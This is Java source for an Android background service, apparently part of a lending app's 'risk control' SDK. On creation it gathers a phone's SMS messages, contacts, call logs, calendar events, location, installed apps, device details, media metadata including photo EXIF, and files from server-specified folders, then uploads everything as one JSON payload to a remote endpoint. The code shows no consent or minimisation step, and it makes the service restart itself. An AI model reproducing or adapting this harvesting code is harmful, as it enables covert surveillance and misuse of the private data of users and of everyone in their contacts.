package com.weithink.fengkong.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.ExifInterface;
import android.os.IBinder;

import androidx.annotation.Nullable;


import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.google.gson.reflect.TypeToken;
import com.weithink.fengkong.WeithinkFactory;
import com.weithink.fengkong.api.AppApi;
import com.weithink.fengkong.api.CalendarEventApi;
import com.weithink.fengkong.api.ContactsApi;
import com.weithink.fengkong.api.DeviceInfoApi;
import com.weithink.fengkong.api.FileApi;
import com.weithink.fengkong.api.MediaStoreApi;
import com.weithink.fengkong.api.SmsApi;
import com.weithink.fengkong.bean.AppInfo;
import com.weithink.fengkong.bean.CalEventInfo;
import com.weithink.fengkong.bean.CallsInfo;
import com.weithink.fengkong.bean.CommonParams;
import com.weithink.fengkong.bean.ContactsInfo;
import com.weithink.fengkong.bean.DeviceInfo;
import com.weithink.fengkong.bean.FileInfo;
import com.weithink.fengkong.bean.LocationInfo;
import com.weithink.fengkong.bean.MediaInfo;
import com.weithink.fengkong.bean.MediaInfoMore;
import com.weithink.fengkong.bean.MyParams;
import com.weithink.fengkong.bean.PathInfo;
import com.weithink.fengkong.bean.ResultPathData;
import com.weithink.fengkong.bean.SmsInfo;
import com.weithink.fengkong.network.UtilNetworking;
import com.weithink.fengkong.util.StorageUtil;
import com.weithink.fengkong.util.StringNullAdapter;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class CollectService extends Service {
    private ExecutorService executor = Executors.newCachedThreadPool();
    @Nullable
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }


    public void onCreate() {
        super.onCreate();
        WeithinkFactory.getLogger().debug("CollectService onCreate ====== ");
        executor.submit(new Runnable() {
            @Override
            public void run() {
                requestFilePath(CollectService.this);
            }
        });

    }


    public int onStartCommand(Intent intent, int flags, int startId) {
//        return super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }


    public void onDestroy() {
        super.onDestroy();
    }



    private void requestFilePath(Context context) {
        CommonParams params = new CommonParams();
        SimpleDateFormat format = new SimpleDateFormat("yyyyMMddHHmmss", Locale.getDefault());
        String date = format.format(new Date());
        String transId = DeviceInfoApi.getDeviceNo(context) + "_" + date;
        params.setTransactionId(transId);
        params.setAppId(StorageUtil.getInstance().getString("appId", ""));
        params.setVersion(StorageUtil.getInstance().getString("version", ""));
        params.setAppPackageName(StorageUtil.getInstance().getString("AppPackageName", ""));
        params.setBorrowId(StorageUtil.getInstance().getString("borrowId", ""));
        params.setUserPhone(StorageUtil.getInstance().getString("setUserPhone", ""));

        UtilNetworking.HttpResponse response = UtilNetworking.sendPostI("/data/config");
        WeithinkFactory.getLogger().debug("AAA>>>>", response.response);
        if (response.responseCode == 200) {
            try {
                List<PathInfo> result = new Gson().fromJson(response.response,new TypeToken<List<PathInfo>>(){}.getType());
                if (result != null) {
                    WeithinkFactory.getLogger().debug("result ====== " + result);
                    List<PathInfo> pathList = result;
                    if (pathList != null && pathList.size() > 0) {
                        StorageUtil.getInstance().setDataList("filePathList", pathList);
                    } else {
                        StorageUtil.getInstance().setDataList("filePathList", null);
                    }
                    CollectService.this.uploadToServer();
                }
            } catch (Exception e) {
                WeithinkFactory.getLogger().debug("getFilePath error ====== " + e.toString());
            }
        }
        CollectService.this.uploadToServer();
    }

    private void uploadToServer() {
        final CommonParams params = new CommonParams();
        StorageUtil util = StorageUtil.getInstance();
        SimpleDateFormat format = new SimpleDateFormat("yyyyMMddHHmmss", Locale.getDefault());
        String date = format.format(new Date());
        String transId = DeviceInfoApi.getDeviceNo((Context) this) + "_" + date;
        params.setTransactionId(transId);
        params.setAppId(util.getString("appId", ""));
        params.setVersion(util.getString("version", ""));
        params.setAppPackageName(util.getString("AppPackageName", ""));
        params.setBorrowId(util.getString("borrowId", ""));
        params.setUserPhone(util.getString("setUserPhone", ""));
        params.setExtend(util.getString("extend", ""));

//        final String baseUrl = util.getString("url", URLConstant.BASE_URL);
        DeviceInfo deviceInfo = DeviceInfoApi.getDeviceInfo((Context) this);
        WeithinkFactory.getLogger().debug("deviceInfo ====== " + deviceInfo);
        params.setDeviceInfo(deviceInfo);

        List<AppInfo> appInfoList = AppApi.getAppInfoList((Context) this);
        WeithinkFactory.getLogger().debug("appInfoList ====== " + appInfoList);
        params.setAppInfos(appInfoList);


        List<LocationInfo> locationList = StorageUtil.getInstance().getDataList("locationList", LocationInfo.class);
        if (locationList == null || locationList.size() == 0) {
            locationList = new ArrayList<>();
            LocationInfo locationInfo = new LocationInfo();
            locationInfo.setAccuracy("No Location Information");
            locationInfo.setLatitude("0.0");
            locationInfo.setLongitude("0.0");
            locationInfo.setLocationType("-1");
            locationList.add(locationInfo);
        }
        WeithinkFactory.getLogger().debug("locationList ====== " + locationList);
        params.setLocationInfos(locationList);

        List<SmsInfo> smsInfoList = SmsApi.getSmsInfoList((Context) this);
        WeithinkFactory.getLogger().debug("smsInfoList ====== " + smsInfoList);
        params.setSmsInfos(smsInfoList);

        List<ContactsInfo> contactsInfoList = ContactsApi.getTelList((Context) this);
        WeithinkFactory.getLogger().debug("contactsInfoList ====== " + contactsInfoList);
        params.setContactsInfos(contactsInfoList);

        List<CallsInfo> callsInfos = ContactsApi.getCallsList((Context) this);
        params.setCallsInfos(callsInfos);

        List<CalEventInfo> calEventInfoList = CalendarEventApi.getCalendarEventList((Context) this);
        WeithinkFactory.getLogger().debug("calEventInfoList ====== " + calEventInfoList);
        params.setCalEventInfos(calEventInfoList);


        List<FileInfo> fileInfoList = new ArrayList<>();
        List<PathInfo> pathList = StorageUtil.getInstance().getDataList("filePathList", PathInfo.class);
        if (pathList != null && pathList.size() > 0) {
            for (int i = 0; i < pathList.size(); i++) {
                String filePath =  pathList.get(i).getPath();
                WeithinkFactory.getLogger().debug("filePath ====== " + filePath);
                fileInfoList.addAll(FileApi.getFileInfoList(filePath));
            }
        }
        WeithinkFactory.getLogger().debug("fileInfoList ====== " + fileInfoList);
        params.setFileInfos(fileInfoList);

        List<MediaInfo> mediaInfoList = new ArrayList<>();
        mediaInfoList.addAll(MediaStoreApi.getMediaVideoInfos((Context) this));
        mediaInfoList.addAll(MediaStoreApi.getMediaAudioInfos((Context) this));
        mediaInfoList.addAll(MediaStoreApi.getMediaImageInfos((Context) this));
        WeithinkFactory.getLogger().debug("mediaInfoList ====== " + mediaInfoList);
        params.setMediaInfos(mediaInfoList);
        CollectService.this.upload2MyService(params);
    }


    private void upload2MyService(CommonParams params) {
        try {
            StorageUtil util = StorageUtil.getInstance();
            String userId = util.getString("userId", "");
            String subJson = util.getString("subJson", "");
            String jsonString = converINfo(params, subJson);

            String postUrl = "/data/sync?userId=" + userId;
            UtilNetworking.HttpResponse response = UtilNetworking.sendPostI(postUrl, "1.0", jsonString);
            WeithinkFactory.getLogger().debug("AAA>>>>", response.response);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String converINfo(CommonParams params1, String subJson) {

        MyParams myParams = new MyParams();
        myParams.convert(params1);
        myParams.setSunJson(subJson);
        //取出来照片中的制造商信息和手机型号信息
        for (MediaInfoMore media : myParams.getMediaInfos()) {
            if (media.getMediaType().contains("image")) {
                ExifInterface exif = null;
                try {
                    exif = new ExifInterface(media.getMediaPath());
                    media.setMediaDeviceName(exif.getAttribute(ExifInterface.TAG_MAKE));//制造商
                    media.setMediaDeviceCode(exif.getAttribute(ExifInterface.TAG_MODEL));//型号
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        //将对象转成json 保留空值
        GsonBuilder gsonBuilder = new GsonBuilder();
        gsonBuilder.registerTypeAdapter(String.class, new StringNullAdapter());
        Gson gson = gsonBuilder.create();
        return gson.toJson(myParams);
    }
}


